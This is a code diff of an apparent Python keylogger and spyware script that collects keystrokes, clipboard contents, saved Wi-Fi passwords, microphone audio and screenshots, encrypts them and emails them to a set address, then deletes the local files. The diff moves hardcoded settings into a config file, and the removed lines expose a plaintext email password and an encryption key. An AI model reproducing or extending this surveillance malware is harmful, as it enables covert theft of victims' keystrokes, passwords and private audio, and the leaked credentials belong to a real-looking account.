@@ -31,32 +31,38 @@ from requests import get
 
 from PIL import ImageGrab
 
-keys_information = "key_log.txt"
-keys_send = "key_send.txt"
-system_information = "systeminfo.txt"
-clipboard_information = "clipboard.txt"
-wifi_information = "wifi_passwords.txt"
-audio_information = "audio.wav"
-screenshot_information = "screenshot.png"
+import json
+
+with open('config.json') as f:
+    config = json.load(f)
 
 
-keys_send_e = "e_keyinfo.txt"
-system_information_e = "e_systeminfo.txt"
-clipboard_information_e = "e_clipboard.txt"
-wifi_information_e = "e_wifi_passwords.txt"
+keys_information = config["keys_information"]
+keys_send = config["keys_send"]
+system_information = config["system_information"]
+clipboard_information = config["clipboard_information"]
+wifi_information = config["wifi_information"]
+audio_information = config["audio_information"]
+screenshot_information = config["screenshot_information"]
 
-microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 1
 
-email_address = "4mt21ic039@mite.ac.in" # Enter disposable email here
-password = "Bhandary@1973" # Enter email password here
+keys_send_e = config["keys_send_e"]
+system_information_e = config["system_information_e"]
+clipboard_information_e = config["clipboard_information_e"]
+wifi_information_e = config["wifi_information_e"]
 
-toaddr = "4mt21ic039@mite.ac.in" # Enter the email address you want to send your information to
+microphone_time = config["microphone_time"]
+time_iteration = config["time_iteration"]
+number_of_iterations_end = config["number_of_iterations_end"]
 
-key = "1-bBQMLJKKtm6KMxxcl_dxRVXa0Co5R7wFT6SrWw14o=" # Generate an encryption key from the Cryptography folder
+email_address = config["email_address"] # Enter disposable email here
+password = config["password"] # Enter email password here
 
-file_path = "D:\\ProgramLogs"# Enter the file path you want your files to be saved to
+toaddr = config["toaddr"] # Enter the email address you want to send your information to
+
+key = config["key"] # Generate an encryption key from the Cryptography folder
+
+file_path = config["file_path"] # Enter the file path you want your files to be saved to
 if not os.path.exists(file_path):
     os.makedirs(file_path)
 extend = "\\"
@@ -219,9 +225,7 @@ def encryption():
         with open(send_file_names[count], 'wb') as f:
             f.write(encrypted)
         count += 1
-    
-
-        
+       
 #send all the logs
 def sending_files():
     count = 0
@@ -315,7 +319,6 @@ while number_of_iterations < number_of_iterations_end:
     number_of_iterations += 1
     currentTime = time.time()
     stoppingTime = time.time() + time_iteration
-
 
 parallel_thread.join()
 delete_files =  system_files + encrypted_system_files + files_to_encrypt + send_file_names 
